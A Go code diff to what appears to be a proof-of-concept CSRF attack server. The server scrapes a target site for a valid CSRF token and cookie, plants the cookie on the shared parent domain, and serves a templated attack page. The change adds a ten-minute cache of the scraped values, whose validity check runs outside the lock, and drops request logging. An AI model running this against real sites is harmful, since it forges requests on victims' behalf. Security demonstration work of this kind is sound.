@@ -15,6 +15,12 @@ import (
 	"golang.org/x/net/publicsuffix"
 )
 
+type cachedScrapeResults struct {
+	Token     string
+	Cookie    string
+	Timestamp time.Time
+}
+
 // attackServer is the server that serves the attack page. It wraps a HTTP
 // client used to scrape the target origin for CSRF cookie and token
 // values to interpolate into pages it serves.
@@ -27,6 +33,8 @@ type attackServer struct {
 	scrapeMutex sync.Mutex
 	// client to use for scraping target w/ cookiejar
 	client *http.Client
+	// Cache for CSRF token and cookie
+	cache *cachedScrapeResults
 }
 
 // newAttackServer creates a new attack server pointed at the specified target.
@@ -45,7 +53,6 @@ func newAttackServer(target string) *attackServer {
 }
 
 func (as *attackServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
-	log.Printf("attackServer: %s %s", r.Method, r.URL.Path)
 	switch r.Method {
 	case "GET":
 		if strings.HasPrefix(r.URL.Path, "/static/") {
@@ -58,14 +65,12 @@ func (as *attackServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-// attackOriginHandler serves the attack page. It first scrapes the target for a
-// valid CSRF token and cookie combination to use in its attack. It sets the
-// CSRF cookie for the common top-level domain (e.g. example.test) using the
-// exfiltrated value scraped from the target. Finally, it templates
-// the attacker page with the scraped token and cookie values.
+// attackOriginHandler serves the attack page. It first checks the cache for a
+// valid CSRF token and cookie combination. If the cache is expired or empty,
+// it scrapes the target for fresh values.
 func (as *attackServer) attackOriginHandler(w http.ResponseWriter, _ *http.Request) {
 	// make request to the target origin to fetch CSRF token & cookie values
-	token, cookie, err := as.scrapeTarget(*domain)
+	token, cookie, err := as.getCachedOrScrapeTarget(*domain)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
 		return
@@ -100,11 +105,34 @@ func (as *attackServer) attackOriginHandler(w http.ResponseWriter, _ *http.Reque
 	}
 }
 
-// scrapeTarget scrapes the target origin for a CSRF token and cookie value.
-func (as *attackServer) scrapeTarget(domain string) (token, cookie string, err error) {
+// getCachedOrScrapeTarget checks the cache for valid CSRF token and cookie values.
+// If the cache is expired or empty, it scrapes the target for fresh values.
+func (as *attackServer) getCachedOrScrapeTarget(domain string) (string, string, error) {
+	// Check if the cache is valid
+	if as.cache != nil && time.Since(as.cache.Timestamp) < 10*time.Minute {
+		return as.cache.Token, as.cache.Cookie, nil
+	}
 	as.scrapeMutex.Lock()
 	defer as.scrapeMutex.Unlock()
 
+	// Perform a live scrape
+	token, cookie, err := as.scrapeTarget(domain)
+	if err != nil {
+		return "", "", err
+	}
+
+	// Update the cache
+	as.cache = &cachedScrapeResults{
+		Token:     token,
+		Cookie:    cookie,
+		Timestamp: time.Now(),
+	}
+
+	return token, cookie, nil
+}
+
+// scrapeTarget scrapes the target origin for a CSRF token and cookie value.
+func (as *attackServer) scrapeTarget(domain string) (token, cookie string, err error) {
 	if *dev {
 		return "test-token", "test-cookie", nil
 	}
